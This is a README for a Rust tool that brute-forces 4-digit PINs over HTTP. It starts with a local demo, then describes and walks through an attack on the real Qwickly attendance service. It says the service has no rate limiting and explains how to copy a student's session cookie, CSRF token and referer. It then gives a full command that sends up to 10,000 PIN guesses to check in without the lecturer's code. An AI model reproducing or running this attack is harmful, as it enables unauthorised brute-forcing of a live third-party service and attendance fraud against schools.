# Crack Remote Pin
Rust example of cracking a 4-digit pin on a remote server.  

The cracking HTTP requests are executed asynchronously, so the futures will take some time to build up to 500 in a vector and then executed at once roughly (there are probably better ways to do this).  

1. Start the pin server
```
cd pin_server
cargo run
```

2. Crack the pin on the running server
```
cd cracker
cargo run
```

## Qwickly Attendance Crack
The qwickly attendance checker asks for a 4-digit pin, which a lecturer will share with the class on a screen. Luckily qwickly don't have any spam-defense mechanisms at all, can make 500 POST requests with different pins in a short space of time without it preventing it.

Build and install on Linux:
```
cd qwickly_cracker
cargo build --release
sudo mv ./target/release/qwickly_cracker /usr/local/bin
qwickly_cracker --help
```

The request needs to be crafted properly though to post without hitting an error - the referer header includes a unique code for each student:

1. Visit Qwickly attendance tracker page and just make a request for pin "0001" or any number, have "network" tab of browser tools open and "copy as cURL" the request

2. Take the required fields out of that(The headers and request body with the CSRF token and pin field) and use it in the command. Make sure to replace "0001" with "{pin}" in the `data-no-pin` content, for example:

```
qwickly_cracker --referer 'https://www.qwickly.tools/attendance/takerecord/?code=BuYAp0o5b11JNFonnZtFrqWxYX2xAI3B&' --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' --cookie 'AWSALB=AoMLFg/sY5unylBB4wo1UuftVvB74l2QvqGuwUZZzkBBPD+04k7cu0Py692RPzeMSdmMSJxUqKhsFWj8X162GHWtMWjr9IPAyE8FTMNXC98aawjJqkylnkNLhKeb; AWSALBCORS=AoMLFg/sY5unylBB4wo1UuftVvB74l2QvqGuwUZZzkBBPD+04k7cu0Py692RPzeMSdmMSJxUqKhsFWj8X162GHWtMWjr9IPAyE8FTMNXC98aawjJqkylnkNLhKeb; sessionid=if3l9orgzd7ydeah0baqn7ynlg2anp1w' --data-no-pin 'csrfmiddlewaretoken=MpUgZaDVxhfOq41BuGIrIGHXzUz8pfWrLiApCa7XM7OTISwq50dx7hvLQnvYiTZV&check_in_pin={pin}&student_check_in=Check+In&check_in_id='
```

3. The default pin range start and end is from 0000 to 9999 inclusive. The default `pin_chunk_size` is 500, meaning that 500 pin requests will be gathered in a vector of futures and then executed. Once a successful pin is found, qwickly will stop returning "Incorrect" in the HTML content, the 500 chunk will complete and the first pin cracked in that chunk is the correct pin and will be printed.
